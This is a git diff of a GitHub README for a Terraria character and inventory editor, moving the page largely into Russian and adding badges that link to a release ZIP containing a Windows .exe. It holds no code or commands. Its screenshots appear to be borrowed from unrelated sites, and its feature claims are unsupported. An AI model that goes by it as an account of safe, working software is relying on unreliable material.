@@ -1,50 +1,56 @@
-# Terraria Character Editor 1.4.5+ | Calamity & Thorium Full Support UPD 03.15.2026
+<div align="center">
 
-<p align="center">
+# Terraria Character Editor 1.4.5+ | Calamity & Thorium Full Support  
+**UPD: 15.03.2026**
+
+<p>
   <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/download/1.0/Terraria.Inventory.Editor.2026.03.10.zip">
-    <img src="https://img.shields.io/badge/Download%20Latest-v1.0%20Ready-22c55e?style=for-the-badge&logo=windows&logoColor=white&labelColor=14532d" alt="Download Latest">
+    <img src="https://img.shields.io/badge/СКАЧАТЬ%20v1.0-Готово!-22c55e?style=for-the-badge&logo=windows&logoColor=white&labelColor=14532d" alt="Download v1.0">
+  </a>
+  &nbsp;&nbsp;
+  <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/latest">
+    <img src="https://img.shields.io/badge/Все%20релизы-181717?style=for-the-badge&logo=github&logoColor=white" alt="All Releases">
   </a>
 </p>
 
-<p align="center">
+<p>
   <img src="https://img.shields.io/github/v/release/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=22c55e&logo=github" alt="Version">
   <img src="https://img.shields.io/github/downloads/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/total?style=flat-square&color=22c55e&logo=github" alt="Downloads">
   <img src="https://img.shields.io/github/stars/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=22c55e&logo=github" alt="Stars">
   <img src="https://img.shields.io/github/license/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=blue&logo=github" alt="MIT License">
 </p>
 
-<p align="center">
-  <em>Windows ZIP • Extract & run .exe • Backup .plr before editing!</em>
-</p>
+<em>Windows ZIP • Распакуй и запусти .exe • Обязательно сделай бэкап .plr / .plrx перед редактированием!</em>
+
+<br>
+
+**Мощный автономный редактор персонажей для Terraria 1.4.5 "Bigger & Boulder"**  
+Редактируй инвентарь, спавнь модовые предметы, разблокируй всё оффлайн — полная поддержка Calamity, Thorium, Fargo's и других модов.
+
+</div>
 
 <p align="center">
-  <em>Powerful standalone tool for Terraria 1.4.5 "Bigger & Boulder" — edit characters, spawn modded items, unlock everything offline.</em>
-</p>
-
----
-
-<p align="center">
-  <img width="80%" src="https://github.com/user-attachments/assets/18c7c2b4-5800-4e79-93dd-61e91f03ad98" alt="Main Editor Interface - Inventory & Journey Research">
+  <img width="80%" src="https://github.com/user-attachments/assets/18c7c2b4-5800-4e79-93dd-61e91f03ad98" alt="Главный интерфейс редактора — инвентарь и исследования Journey">
   <br><br>
-  <em>Dark ImGui UI • Drag-and-drop • Live character preview • Mod support</em>
+  <em>Тёмная ImGui тема • Drag-and-drop • Живое превью персонажа • Поддержка модов</em>
 </p>
 
 <p align="center">
-  <img width="45%" src="https://user-images.githubusercontent.com/40578274/89720219-8a057c00-d9d8-11ea-98a1-46c151295583.png" alt="ImGui Dark Theme Example">
-  <img width="45%" src="https://forums.terraria.org/index.php?attachments/20230227010840_1-jpg.400381/" alt="Terraria Modded UI Inspiration">
+  <img width="45%" src="https://user-images.githubusercontent.com/40578274/89720219-8a057c00-d9d8-11ea-98a1-46c151295583.png" alt="Пример тёмной темы ImGui">
+  <img width="45%" src="https://forums.terraria.org/index.php?attachments/20230227010840_1-jpg.400381/" alt="Вдохновение от модового интерфейса Terraria">
   <br><br>
-  <em>Modern dockable windows • Compact mode • Item browser with filters</em>
+  <em>Док-панели • Компактный режим • Браузер предметов с фильтрами</em>
 </p>
 
 <p align="center">
-  <img width="60%" src="https://cybrancee.com/learn/wp-content/uploads/2025/10/CybranceeTerrariaCustomizingMenuOutlined.png" alt="Terraria Character Creation Preview">
+  <img width="60%" src="https://cybrancee.com/learn/wp-content/uploads/2025/10/CybranceeTerrariaCustomizingMenuOutlined.png" alt="Превью создания персонажа">
   <br><br>
-  <em>Full character creator support • Hair, skin, transformations preview</em>
+  <em>Полная поддержка создателя персонажа • Волосы, кожа, трансформации в реальном времени</em>
 </p>
 
 <div align="center">
 
-### 📥 Где скачать и обсудить проект
+### 📥 Где скачать и обсудить
 
 <p>
   <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/latest">
@@ -56,9 +62,6 @@
   <a href="https://www.nexusmods.com/terraria/mods/167?tab=files">
     <img src="https://img.shields.io/badge/Nexus_Mods-Загрузка-E74C3C?style=for-the-badge&logoColor=white" alt="Nexus Mods">
   </a>
-</p>
-
-<p>
   <a href="https://vgtimes.com/games/terraria/files/92830-terraria-character-editor-mod-support-1.4.5.html">
     <img src="https://img.shields.io/badge/VGtimes_RU-Загрузка_(RU)-3498DB?style=for-the-badge&logoColor=white" alt="VGtimes RU">
   </a>
@@ -71,8 +74,10 @@
 
 <hr>
 
-## Features
-...
+<div align="center">
+  <sub>Сделано с ❤️ для Terraria-сообщества • MIT License • v1.0 — март 2026</sub>
+</div>
+
 
 ## Why Choose This Terraria Inventory Editor in 2026?
 
